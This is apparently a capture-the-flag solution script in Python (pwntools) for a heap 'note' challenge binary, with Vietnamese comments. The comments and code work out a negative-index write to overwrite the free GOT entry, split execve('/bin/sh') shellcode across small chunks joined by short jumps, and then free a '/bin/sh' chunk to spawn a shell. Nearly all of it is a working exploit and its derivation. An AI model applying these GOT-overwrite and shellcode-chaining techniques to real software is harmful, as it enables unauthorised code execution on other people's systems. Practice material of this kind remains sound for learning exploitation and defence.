from pwn import *
import base64

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
breakrva 0xe28
continue
'''.format(**locals())

#Binary filename
exe = './note'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

'''
Bai nay nhieu loi nhu UAF va khong check index dau vao add, ko cho edit nen ko UAF bo
nen t di theo huong hijack GOT.table vi index dau vao ko check va co Reltro Partial
nen ta co the ghi de 
Got table offset free.got = 0x2018
vi tri offset heap pointer = 0x20a0
==> offset = 0x88/8 = 17
Moi chunk mac dinh cho nhap 8 size nhung ta chi co the nhap 7 nen gio viet shellcode
len chunk can cac chunk khac nhau nen t co the su dung lenh jump 
(        00100aed eb 48           JMP        LAB_00100b37
0xaed - 0xb37 - 2 = 0x48
toan hang se la tu vi tri nhay den vi tri dich 
)
Jump xxx tuong ung la 2 byte nen ta chi co 5 byte viet vao chunk
moi data chunk cach nhau:
0x555555603290  0x0000000000000000      0x0000000000000021      ........!.......
0x5555556032a0  0x0061616161616161      0x0000000000000000      aaaaaaa.........
0x5555556032b0  0x0000000000000000      0x0000000000000021      ........!.......
0x5555556032c0  0x0062626262626262      0x0000000000000000      bbbbbbb.........
0x5555556032d0  0x0000000000000000      0x0000000000020d31
ta co the thay khoang cach cua 2 lenh la : 0xc0 - 0x15 - 0x2 = 0x19
shellcode:
mov rdi, $'/bin/sh'
xor rsi, rsi     len = 3
xor rdx, rdx           3
mov eax, 0x3b          5
syscall                2
do do khi viet vao chunk
##1
xor rsi, rsi
nop
nop
jump short 0x19
##2
mov eax, 0x3b
jump short 0x19
##3
xor rdx, rdx
nop
nop
jump short 0x19
##4 syscall
truyen /bin/sh vao 1 chunk va free no la co shell
'''

def add(index, content):
    p.sendlineafter(b"your choice>> ", '1')
    p.sendlineafter(b"index:", str(index))
    p.sendlineafter(b"size:", str(8))
    p.sendlineafter(b"content:", (content))

def delete(index):
    p.sendlineafter(b"your choice>> ", '4')
    p.sendlineafter(b"index:", str(index))

add(0, '/bin/sh')
add(-17, asm("xor rsi,rsi") + b"\x90\x90\xeb\x19")
add(1, asm("mov eax,0x3b") + b"\xeb\x19")
add(2, asm("xor rdx,rdx") + b"\x90\x90\xeb\x19")
add(3, asm("syscall").ljust(7, b"\x00"))

delete(0)
p.interactive()
